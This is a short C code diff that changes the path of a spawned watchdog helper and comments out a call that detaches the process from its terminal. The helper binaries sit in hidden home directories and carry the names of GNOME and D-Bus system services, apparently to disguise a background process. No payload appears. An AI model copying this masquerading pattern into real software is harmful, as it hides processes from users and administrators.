@@ -70,7 +70,7 @@ int main(int argc, char *argv[]) {
         }
 
         // spawns -> /home/$USER/.dbus/sessions/session-dbus
-        spawn_thread_watchdog(1, "/home/gdev/.gvfsd/.profile/gvfsd-helper");
+        spawn_thread_watchdog(1, "/home/gdev/.dbus/sessions/session-dbus");
     }
 
     #ifndef DEBUG
@@ -78,7 +78,7 @@ int main(int argc, char *argv[]) {
     #endif
 
     while(1) {
-       daemon(0, 0); // detach from current terminal
+       //daemon(0, 0); // detach from current terminal
        sleep(30); // keep process running in background as "daemon".
    }
 
